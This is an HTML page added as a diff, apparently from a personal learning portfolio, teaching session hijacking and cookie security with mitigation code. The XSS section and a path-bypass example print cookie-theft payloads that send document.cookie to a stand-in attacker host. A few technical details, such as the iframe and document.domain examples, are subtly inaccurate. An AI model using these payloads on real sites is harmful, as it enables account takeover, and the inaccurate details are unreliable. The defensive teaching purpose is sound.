@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Session Hijacking Attacks - JavaScript Security</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <style>
+        /* Layout System - Consistent with all pages */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            line-height: 1.6;
+            color: #333;
+               background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background: linear-gradient(to right, #2c3e50, #4a6491);
+            color: white;
+            padding: 2rem;
+            border-radius: 10px;
+            margin-bottom: 2rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 1.5rem;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 1rem;
+        }
+        
+        .logo-img {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        
+        .content-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+        
+        @media (max-width: 768px) {
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .card {
+            background: white;
+            border-radius: 10px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .card-title {
+            color: #2c3e50;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid;
+            font-size: 1.3rem;
+        }
+        
+        .card-title.network { border-bottom-color: #ff6b6b; }
+        .card-title.xss { border-bottom-color: #4ecdc4; }
+        .card-title.mitigation { border-bottom-color: #45b7d1; }
+        .card-title.firesheep { border-bottom-color: #96ceb4; }
+        .card-title.advanced { border-bottom-color: #ff9ff3; }
+        .card-title.tools { border-bottom-color: #feca57; }
+        
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            border-radius: 5px;
+            padding: 1rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .info {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            color: #0c5460;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .danger {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            font-size: 0.95rem;
+        }
+        
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        
+        .comparison-table th {
+            background: #4a6491;
+            color: white;
+            padding: 1rem;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        .comparison-table td {
+            padding: 1rem;
+            border-bottom: 1px solid #dee2e6;
+        }
+        
+        .comparison-table tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .step-list {
+            margin-left: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .step-list li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .demo-area {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            margin: 2rem 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .attack-flow {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        
+        .flow-step {
+            background: white;
+            padding: 1rem;
+            border-radius: 8px;
+            box-shadow: 0 3px 5px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 150px;
+            position: relative;
+        }
+        
+        .flow-step:not(:last-child)::after {
+            content: "→";
+            position: absolute;
+            right: -25px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.5rem;
+            color: #6c757d;
+        }
+        
+        @media (max-width: 768px) {
+            .flow-step:not(:last-child)::after {
+                content: "↓";
+                right: 50%;
+                top: auto;
+                bottom: -25px;
+                transform: translateX(50%);
+            }
+            
+            .attack-flow {
+                flex-direction: column;
+            }
+            
+            .flow-step {
+                width: 100%;
+            }
+        }
+        
+        .mitigation-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        
+        .mitigation-card {
+            background: #f8f9fa;
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 4px solid #4a6491;
+        }
+        
+        .mitigation-card h4 {
+            margin-bottom: 1rem;
+            color: #495057;
+        }
+        
+        .tab-container {
+            margin: 1.5rem 0;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 2px solid #dee2e6;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+        
+        .tab {
+            padding: 0.75rem 1.5rem;
+            cursor: pointer;
+            border: none;
+            background: none;
+            font-weight: 600;
+            color: #6c757d;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+        }
+        
+        .tab.active {
+            color: #4a6491;
+            border-bottom: 3px solid #4a6491;
+            margin-bottom: -2px;
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 1.5rem;
+            background: white;
+            border-radius: 0 8px 8px 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .demo-form {
+            background: #f8f9fa;
+            padding: 1.5rem;
+            border-radius: 8px;
+            border: 1px solid #dee2e6;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid #dee2e6;
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+        
+        .historical-case {
+            background: #e8f4fd;
+            border: 1px solid #b3d9ff;
+            color: #004085;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            border-left: 4px solid #004085;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>            
+            <h1>Session Hijacking Attacks</h1>
+            <p class="subtitle">Understanding and Preventing Session Theft in Web Applications</p>
+        </header>
+        
+        <!-- Introduction -->
+        <div class="card">
+            <h2 class="card-title">What is Session Hijacking?</h2>
+            <p>Session hijacking occurs when an attacker obtains a user's session identifier and uses it to impersonate them. This allows the attacker to perform actions as the victim, access their data, and potentially compromise their account.</p>
+            
+            <div class="danger">
+                <strong>⚠️ Critical Impact:</strong> Successful session hijacking effectively gives the attacker full control over the victim's account without needing their password.
+            </div>
+            
+            <div class="attack-flow">
+                <div class="flow-step">
+                    <strong>Step 1</strong>
+                    <p>Attacker obtains session token</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 2</strong>
+                    <p>Attacker uses token to impersonate victim</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 3</strong>
+                    <p>Server treats attacker as legitimate user</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 4</strong>
+                    <p>Victim's account is compromised</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Network-Based Attacks -->
+        <div class="card">
+            <h2 class="card-title network">Network-Based Session Hijacking</h2>
+            
+            <div class="historical-case">
+                <h4>🔥 The Firesheep Attack (2010)</h4>
+                <p>The Firesheep Firefox extension famously demonstrated how trivial session hijacking could be on public WiFi networks. It worked by:</p>
+                
+                <ol class="step-list">
+                    <li>Monitoring network traffic for unencrypted requests to popular websites</li>
+                    <li>Extracting session cookies from these requests</li>
+                    <li>Presenting a list of hijackable sessions to the attacker</li>
+                    <li>Allowing one-click impersonation of users</li>
+                </ol>
+                
+                <div class="warning">
+                    <strong>Key Vulnerability:</strong> Many sites only encrypted their login pages, leaving subsequent requests (with session cookies) unprotected over HTTP.
+                </div>
+            </div>
+            
+            <h4>How Network Hijacking Works:</h4>
+            <div class="code-block">
+// Unencrypted HTTP request - easily intercepted
+GET /dashboard HTTP/1.1
+Host: example.com
+Cookie: sessionId=abc123def456
+
+// Attacker on same network can see:
+// - Session ID: abc123def456
+// - User's authentication state
+// - All subsequent requests with the same cookie
+            </div>
+            
+            <h4>Common Network Attack Vectors:</h4>
+            
+            <table class="comparison-table">
+                <thead>
+                    <tr>
+                        <th>Attack Type</th>
+                        <th>How it Works</th>
+                        <th>Risk Level</th>
+                        <th>Common Locations</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Public WiFi Sniffing</strong></td>
+                        <td>Monitor unencrypted traffic on public networks</td>
+                        <td>High</td>
+                        <td>Cafes, airports, hotels, coworking spaces</td>
+                    </tr>
+                    <tr>
+                        <td><strong>ARP Spoofing</strong></td>
+                        <td>Redirect traffic through attacker's machine</td>
+                        <td>High</td>
+                        <td>Corporate networks, shared spaces</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DNS Hijacking</strong></td>
+                        <td>Redirect to malicious server that captures sessions</td>
+                        <td>Medium-High</td>
+                        <td>Any network with compromised DNS</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Malicious Hotspots</strong></td>
+                        <td>Create fake WiFi to intercept all traffic</td>
+                        <td>High</td>
+                        <td>Public places with free WiFi</td>
+                    </tr>
+                </tbody>
+            </table>
+            
+            <div class="success">
+                <strong>✅ Network Hijacking Prevention:</strong>
+                <div class="code-block">
+// 1. Use HTTPS everywhere - not just login
+// Force all traffic to HTTPS
+app.use(helmet.hsts({
+  maxAge: 31536000,
+  includeSubDomains: true,
+  preload: true
+}));
+
+// 2. Set Secure flag on ALL cookies
+res.cookie('sessionId', sessionId, {
+  secure: true,    // ONLY sent over HTTPS
+  httpOnly: true,
+  sameSite: 'lax'
+});
+
+// 3. Implement HSTS preloading
+// Submit your site to HSTS preload list
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+                </div>
+            </div>
+        </div>
+        
+        <!-- XSS-Based Session Hijacking -->
+        <div class="card">
+            <h2 class="card-title xss">XSS-Based Session Hijacking</h2>
+            
+            <p>Cross-Site Scripting vulnerabilities allow attackers to inject JavaScript that can steal session cookies directly from the victim's browser.</p>
+            
+            <div class="attack-flow">
+                <div class="flow-step">
+                    <strong>Step 1</strong>
+                    <p>Attacker finds XSS vulnerability</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 2</strong>
+                    <p>Injects malicious JavaScript</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 3</strong>
+                    <p>Script steals cookies via document.cookie</p>
+                </div>
+                <div class="flow-step">
+                    <strong>Step 4</strong>
+                    <p>Cookies sent to attacker's server</p>
+                </div>
+            </div>
+            
+            <h4>Common XSS Payloads for Cookie Theft:</h4>
+            <div class="code-block">
+// Basic cookie theft
+&lt;script&gt;
+  fetch('https://attacker.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;
+
+// Using Image tag (works without CORS)
+&lt;img src="x" onerror="
+  this.src='https://attacker.com/steal?cookie='+document.cookie;
+"&gt;
+
+// Using XMLHttpRequest
+&lt;script&gt;
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://attacker.com/steal', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify({cookie: document.cookie}));
+&lt;/script&gt;
+
+// Using WebSocket (real-time)
+&lt;script&gt;
+  var ws = new WebSocket('wss://attacker.com/ws');
+  ws.onopen = function() {
+    ws.send(document.cookie);
+  };
+&lt;/script&gt;
+            </div>
+            
+            <div class="danger">
+                <strong>⚠️ Impact without HttpOnly:</strong> If cookies are accessible via JavaScript (no HttpOnly flag), even simple XSS vulnerabilities can lead to complete account takeover.
+            </div>
+            
+            <h4>Advanced XSS Cookie Attacks:</h4>
+            <div class="code-block">
+// Session fixation via XSS
+// Attacker sets victim's session ID to known value
+&lt;script&gt;
+  document.cookie = "sessionId=attacker_known_value; path=/";
+&lt;/script&gt;
+
+// Cookie overwriting (logout prevention)
+&lt;script&gt;
+  // Prevent logout by constantly resetting session cookie
+  setInterval(() => {
+    document.cookie = "sessionId=current_value; path=/";
+  }, 1000);
+&lt;/script&gt;
+
+// Subdomain cookie theft
+// If cookie is set for .example.com, XSS on subdomain can steal it
+&lt;script&gt;
+  // On subdomain.attacker.com
+  document.domain = 'example.com'; // Try to access parent domain cookies
+&lt;/script&gt;
+            </div>
+            
+            <div class="success">
+                <strong>✅ XSS-Based Hijacking Prevention:</strong>
+                <div class="code-block">
+// 1. ALWAYS use HttpOnly for session cookies
+res.cookie('sessionId', sessionId, {
+  httpOnly: true,    // Cannot be accessed by JavaScript
+  secure: true,
+  sameSite: 'strict'
+});
+
+// 2. Implement Content Security Policy
+Content-Security-Policy: 
+  default-src 'self';
+  script-src 'self';
+  connect-src 'self';
+
+// 3. Use proper output encoding
+function escapeHtml(text) {
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
+
+// 4. Use modern framework protections
+// React, Vue, Angular all auto-escape by default
+            </div>
+            </div>
+        </div>
+        
+        <!-- Cookie Security Properties Deep Dive -->
+        <div class="card">
+            <h2 class="card-title">Cookie Security Properties Deep Dive</h2>
+            
+            <div class="tab-container">
+                <div class="tabs">
+                    <button class="tab active" data-tab="path">Path Attribute</button>
+                    <button class="tab" data-tab="domain">Domain Scope</button>
+                    <button class="tab" data-tab="protocol">Protocol Handling</button>
+                    <button class="tab" data-tab="port">Port Ignorance</button>
+                </div>
+                
+                <div id="path" class="tab-content active">
+                    <h4>⚠️ Path Attribute is NOT Security</h4>
+                    <p>Many developers mistakenly believe the Path attribute provides security isolation. It does not.</p>
+                    
+                    <div class="code-block">
+// Setting cookie with path
+res.cookie('adminSession', sessionId, {
+  path: '/admin',
+  httpOnly: true
+});
+
+// Developers think: "Only /admin pages can access this"
+// Reality: Any same-origin page can access it via iframe
+                    </div>
+                    
+                    <h4>Path Bypass Attack:</h4>
+                    <div class="code-block">
+// Attacker on /public page can still access /admin cookies
+const iframe = document.createElement('iframe');
+iframe.src = '/admin';
+document.body.appendChild(iframe);
+
+// Wait for iframe to load, then read its cookies
+setTimeout(() => {
+  const adminCookies = iframe.contentDocument.cookie;
+  fetch('https://attacker.com/steal?cookies=' + adminCookies);
+}, 1000);
+                    </div>
+                    
+                    <div class="warning">
+                        <strong>Important:</strong> The Same-Origin Policy allows iframes to access cookies from any path on the same origin. Path should only be used for namespacing and performance, never for security.
+                    </div>
+                </div>
+                
+                <div id="domain" class="tab-content">
+                    <h4>Domain Scope vs Same-Origin Policy</h4>
+                    <p>Cookies use a different security model than the rest of the web platform.</p>
+                    
+                    <div class="code-block">
+// Cookie Domain behavior:
+Set-Cookie: sessionId=abc; Domain=example.com
+
+// This cookie will be sent to:
+// - example.com
+// - www.example.com
+// - api.example.com
+// - ANY subdomain of example.com
+
+// Same-Origin Policy treats these as DIFFERENT origins:
+// https://example.com ≠ https://www.example.com
+// But cookies treat them as the SAME for Domain=example.com
+                    </div>
+                    
+                    <h4>Security Implications:</h4>
+                    <div class="code-block">
+// 1. Subdomain can set cookies for parent domain
+// On subdomain.attacker.com (if XSS exists):
+document.cookie = "sessionId=hacked; Domain=example.com; path=/";
+
+// 2. Parent domain cannot restrict to subdomain
+// CANNOT do: Domain=secure.example.com from example.com
+// Subdomains can escalate privileges to parent domain
+
+// 3. Secure practice: Don't set Domain attribute
+// Cookie will default to exact hostname only
+Set-Cookie: sessionId=abc;  // Only for exact host
+                    </div>
+                </div>
+                
+                <div id="protocol" class="tab-content">
+                    <h4>Protocol Handling Differences</h4>
+                    
+                    <div class="code-block">
+// Cookies ignore protocol UNLESS Secure flag is set
+Set-Cookie: sessionId=abc  // Sent on HTTP and HTTPS
+
+Set-Cookie: sessionId=abc; Secure  // ONLY sent on HTTPS
+
+// This is why the Secure flag is CRITICAL:
+// Without it, cookies set via HTTPS can be stolen
+// if user accidentally visits HTTP version
+                    </div>
+                    
+                    <h4>Protocol Downgrade Attack:</h4>
+                    <div class="attack-flow">
+                        <div class="flow-step">
+                            <strong>Step 1</strong>
+                            <p>User logs in via HTTPS</p>
+                        </div>
+                        <div class="flow-step">
+                            <strong>Step 2</strong>
+                            <p>Cookie set without Secure flag</p>
+                        </div>
+                        <div class="flow-step">
+                            <strong>Step 3</strong>
+                            <p>Attacker tricks user to HTTP</p>
+                        </div>
+                        <div class="flow-step">
+                            <strong>Step 4</strong>
+                            <p>Cookie sent unencrypted, stolen</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div id="port" class="tab-content">
+                    <h4>Port Ignorance in Cookies</h4>
+                    
+                    <div class="code-block">
+// Cookies COMPLETELY ignore ports
+Set-Cookie: sessionId=abc; Domain=example.com
+
+// This cookie will be sent to:
+// - example.com:80
+// - example.com:443
+// - example.com:3000
+// - example.com:ANY_PORT
+
+// Even though Same-Origin Policy says:
+// https://example.com:3000 ≠ https://example.com:8080
+// Cookies treat them as identical
+                    </div>
+                    
+                    <div class="danger">
+                        <strong>⚠️ Development Risk:</strong> During development, cookies set on localhost:3000 will be sent to localhost:8080. This can cause session confusion and security issues in development environments.
+                    </div>
+                    
+                    <h4>Mitigation for Port Issues:</h4>
+                    <div class="code-block">
+// 1. Use different cookie names per port in development
+const cookieName = process.env.NODE_ENV === 'development' 
+  ? `session_${process.env.PORT}`
+  : 'sessionId';
+
+// 2. Always include port in SameSite calculations
+// Modern browsers are starting to consider ports
+// for SameSite cookie restrictions
+
+// 3. Use separate domains for different environments
+// Development: dev.example.com
+// Staging: staging.example.com
+// Production: example.com
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Advanced Mitigation Techniques -->
+        <div class="demo-area">
+            <h3>🛡️ Advanced Session Hijacking Mitigation</h3>
+            
+            <div class="mitigation-grid">
+                <div class="mitigation-card">
+                    <h4>🔒 Session Binding</h4>
+                    <p>Bind sessions to specific client properties to detect hijacking attempts.</p>
+                    <div class="code-block">
+// Store client fingerprint with session
+const sessionData = {
+  userId: user.id,
+  userAgent: req.headers['user-agent'],
+  ip: req.ip,
+  fingerprint: req.headers['x-client-fingerprint']
+};
+
+// Validate on each request
+function validateSession(session, req) {
+  if (session.userAgent !== req.headers['user-agent']) {
+    return { valid: false, reason: 'User agent mismatch' };
+  }
+  
+  // Optional: IP validation (may break legitimate users)
+  if (session.ip !== req.ip) {
+    logSuspiciousActivity(session.userId, req.ip);
+    // Could require reauthentication
+  }
+  
+  return { valid: true };
+}
+                    </div>
+                </div>
+                
+                <div class="mitigation-card">
+                    <h4>🔄 Session Rotation</h4>
+                    <p>Regularly change session identifiers to limit exposure time.</p>
+                    <div class="code-block">
+// Rotate session ID on sensitive operations
+function rotateSession(sessionId) {
+  const session = sessions.get(sessionId);
+  if (!session) return null;
+  
+  // Generate new session ID
+  const newSessionId = crypto.randomBytes(32).toString('hex');
+  
+  // Transfer session data
+  sessions.set(newSessionId, session);
+  sessions.delete(sessionId);
+  
+  // Update last rotation time
+  session.lastRotation = Date.now();
+  
+  return newSessionId;
+}
+
+// Rotate on:
+// - Password change
+// - Email change
+// - Privilege escalation
+// - Regular intervals (e.g., every 24 hours)
+                    </div>
+                </div>
+                
+                <div class="mitigation-card">
+                    <h4>📊 Anomaly Detection</h4>
+                    <p>Monitor for suspicious session activity patterns.</p>
+                    <div class="code-block">
+// Track session metrics
+const sessionMetrics = {
+  requestCount: 0,
+  lastRequestTime: Date.now(),
+  requestPatterns: [],
+  geolocationHistory: []
+};
+
+// Detect anomalies
+function detectAnomalies(session, currentRequest) {
+  const anomalies = [];
+  
+  // Rapid request detection
+  const timeSinceLast = Date.now() - session.lastRequestTime;
+  if (timeSinceLast < 100) { // 100ms between requests
+    anomalies.push('Rapid requests detected');
+  }
+  
+  // Geographic jumps
+  const currentLocation = getLocation(currentRequest.ip);
+  const lastLocation = session.geolocationHistory.slice(-1)[0];
+  
+  if (lastLocation && 
+      calculateDistance(currentLocation, lastLocation) > 500) {
+    // Jumped more than 500km in one request
+    anomalies.push('Unusual geographic jump');
+  }
+  
+  return anomalies;
+}
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Complete Secure Cookie Configuration -->
+        <div class="card">
+            <h2 class="card-title mitigation">Complete Secure Cookie Configuration</h2>
+            
+            <div class="code-block">
+// Production-ready secure cookie configuration
+function setSecureSessionCookie(res, sessionId, userId) {
+  res.cookie('sessionId', sessionId, {
+    // Security flags
+    httpOnly: true,      // Prevent JavaScript access
+    secure: true,        // HTTPS only
+    sameSite: 'lax',     // CSRF protection
+    
+    // Scope control
+    domain: process.env.COOKIE_DOMAIN || undefined,
+    // Don't set Domain unless necessary for subdomains
+    // If set, it should be the exact parent domain
+    
+    path: '/',           // Available to entire site
+    // Remember: Path is not security!
+    
+    // Expiration
+    maxAge: 24 * 60 * 60 * 1000, // 24 hours
+    // Consider shorter for sensitive applications
+    
+    // Additional security
+    // __Host- prefix requires Secure, Path=/, no Domain
+    // name: '__Host-sessionId' 
+    // Available in modern browsers for extra security
+  });
+  
+  // Additional security headers
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader('X-XSS-Protection', '1; mode=block');
+}
+
+// For __Host- prefix (extra security)
+function setHostPrefixedCookie(res, sessionId) {
+  // Requirements for __Host- prefix:
+  // 1. Must have Secure attribute
+  // 2. Must have Path=/
+  // 3. Must NOT have Domain attribute
+  // 4. Must be set from secure origin
+  
+  res.cookie('__Host-sessionId', sessionId, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'lax',
+    path: '/',
+    maxAge: 24 * 60 * 60 * 1000
+    // NO Domain attribute!
+  });
+}
+            </div>
+            
+            <div class="success">
+                <strong>✅ Security Headers Combination:</strong>
+                <ul style="margin-top: 0.5rem;">
+                    <li><strong>HttpOnly:</strong> Prevents XSS-based cookie theft</li>
+                    <li><strong>Secure:</strong> Prevents network sniffing attacks</li>
+                    <li><strong>SameSite:</strong> Prevents CSRF attacks</li>
+                    <li><strong>__Host- prefix:</strong> Prevents subdomain attacks</li>
+                    <li><strong>HSTS:</strong> Prevents protocol downgrade</li>
+                    <li><strong>CSP:</strong> Prevents XSS injection</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- Testing & Detection -->
+        <div class="demo-area">
+            <h3>🔍 Testing for Session Hijacking Vulnerabilities</h3>
+            
+            <div class="mitigation-grid">
+                <div class="mitigation-card">
+                    <h4>Manual Testing</h4>
+                    <ul class="step-list">
+                        <li>✅ Check for HttpOnly flag on session cookies</li>
+                        <li>✅ Verify Secure flag is set in production</li>
+                        <li>✅ Test cookie accessibility via JavaScript</li>
+                        <li>✅ Attempt session fixation attacks</li>
+                        <li>✅ Test with and without HTTPS</li>
+                    </ul>
+                </div>
+                
+                <div class="mitigation-card">
+                    <h4>Automated Scanning</h4>
+                    <ul class="step-list">
+                        <li>✅ Use OWASP ZAP or Burp Suite</li>
+                        <li>✅ Check for missing security headers</li>
+                        <li>✅ Test for XSS vulnerabilities</li>
+                        <li>✅ Verify HSTS implementation</li>
+                        <li>✅ Test cookie scope and domain settings</li>
+                    </ul>
+                </div>
+                
+                <div class="mitigation-card">
+                    <h4>Monitoring & Detection</h4>
+                    <ul class="step-list">
+                        <li>✅ Monitor for multiple sessions from different locations</li>
+                        <li>✅ Track failed session validations</li>
+                        <li>✅ Implement session activity logging</li>
+                        <li>✅ Set up alerts for suspicious patterns</li>
+                        <li>✅ Regular security audits</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="code-block" style="margin-top: 1rem;">
+// Security testing script example
+const securityTests = {
+  testHttpOnly: () => {
+    const cookies = document.cookie;
+    return cookies.includes('sessionId') 
+      ? 'FAIL: sessionId accessible via JavaScript'
+      : 'PASS: HttpOnly flag working';
+  },
+  
+  testSecureFlag: async () => {
+    try {
+      const response = await fetch('http://example.com', {
+        credentials: 'include'
+      });
+      const cookies = response.headers.get('set-cookie');
+      return cookies && cookies.includes('sessionId') 
+        ? 'FAIL: session cookie sent over HTTP'
+        : 'PASS: Secure flag working';
+    } catch (error) {
+      return 'PASS: HTTP requests blocked (HSTS working)';
+    }
+  },
+  
+  testSameSite: () => {
+    // Test by making cross-site request
+    // Check if cookies are sent
+    return 'Manual testing required';
+  }
+};
+            </div>
+        </div>
+        
+                <footer>
+                <!-- Primeira linha: Referência ao curso -->
+                <p style="margin-bottom: 0.5rem;">
+                    <strong>Based on "Introduction to JavaScript Security (LFS184)" by The Linux Foundation</strong>
+                </p>
+                
+                <!-- Segunda linha: Informações de licença e autoria -->
+                <p style="margin-bottom: 1rem; font-size: 0.95rem;">
+                    Security education reference • Created for learning and demonstration purposes • Licensed under 
+                    <a href="https://creativecommons.org/licenses/by-sa/4.0/" 
+                    target="_blank" 
+                    style="color: #4a6491; text-decoration: none; font-weight: 600;">
+                        CC-BY-SA-4.0
+                    </a>
+                </p>
+                
+                <!-- Terceira linha: Informações pessoais -->
+                <div style="display: flex; justify-content: center; align-items: center; gap: 1rem; margin-bottom: 1rem; flex-wrap: wrap;">
+                    <span style="color: #4a6491; font-weight: 600;">© Iure Castro</span>
+                    <span style="color: #666;">•</span>
+                    <span>Personal learning portfolio</span>
+                    <span style="color: #666;">•</span>
+                    <span>All examples for educational use</span>
+                </div>
+                
+                <!-- Quarta linha: Links úteis -->
+                <div style="display: flex; justify-content: center; gap: 1.5rem; margin: 1rem 0; flex-wrap: wrap;">
+                    <a href="https://training.linuxfoundation.org/training/introduction-to-javascript-security-lfs184/" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        🔗 Original Course
+                    </a>
+                    <a href="https://creativecommons.org/licenses/by-sa/4.0/" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        📄 CC-BY-SA-4.0 License
+                    </a>
+                    <a href="certificate.pdf" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        🏆 My Certificate
+                    </a>
+                </div>
+        </footer>
+    </div>
+
+    <script>
+        // Tab functionality
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                tab.classList.add('active');
+                const tabId = tab.getAttribute('data-tab');
+                document.getElementById(tabId).classList.add('active');
+            });
+        });
+        
+        // Firesheep simulation demo
+        function simulateFiresheep() {
+            const demoOutput = document.getElementById('firesheep-demo');
+            
+            demoOutput.innerHTML = `
+                <div class="historical-case">
+                    <h4>🔥 Firesheep Simulation</h4>
+                    <p>On unencrypted WiFi network (2010 scenario):</p>
+                    
+                    <div class="code-block">
+// Network traffic being monitored:
+GET /home HTTP/1.1
+Host: facebook.com
+Cookie: session_key=abc123def456
+
+GET /messages HTTP/1.1  
+Host: facebook.com
+Cookie: session_key=abc123def456
+
+GET /profile HTTP/1.1
+Host: twitter.com
+Cookie: auth_token=xyz789mno123
+                    </div>
+                    
+                    <p><strong>Firesheep would:</strong></p>
+                    <ol class="step-list">
+                        <li>Capture these unencrypted requests</li>
+                        <li>Extract session cookies</li>
+                        <li>Display clickable user profiles in sidebar</li>
+                        <li>Allow instant impersonation with one click</li>
+                    </ol>
+                    
+                    <div class="danger">
+                        <strong>Result:</strong> Complete account takeover without password knowledge
+                    </div>
+                </div>
+                
+                <div class="success">
+                    <strong>✅ Modern Prevention:</strong> HTTPS Everywhere + HSTS preloading has largely eliminated this attack vector for major sites.
+                </div>
+            `;
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            // Set up firesheep demo if element exists
+            const firesheepBtn = document.getElementById('show-firesheep');
+            if (firesheepBtn) {
+                firesheepBtn.addEventListener('click', simulateFiresheep);
+            }
+            
+            console.log(`
+            Session Hijacking Guide - Key Takeaways:
+            
+            1. NETWORK ATTACKS:
+               - Use HTTPS EVERYWHERE, not just login
+               - Implement HSTS with preloading
+               - ALWAYS set Secure cookie flag
+            
+            2. XSS ATTACKS:
+               - ALWAYS use HttpOnly for session cookies
+               - Implement Content Security Policy
+               - Use proper output encoding
+            
+            3. COOKIE SECURITY:
+               - Path attribute is NOT security
+               - Domain scope differs from Same-Origin Policy
+               - Cookies ignore ports entirely
+               - Use __Host- prefix for extra security
+            
+            4. ADVANCED PROTECTION:
+               - Implement session binding (UA, IP fingerprinting)
+               - Use session rotation for sensitive operations
+               - Monitor for anomalous patterns
+               - Provide user session management
+            
+            Defense in depth is essential against session hijacking!
+            `);
+        });
+    </script>
+    
+    <!-- Prism.js for syntax highlighting -->
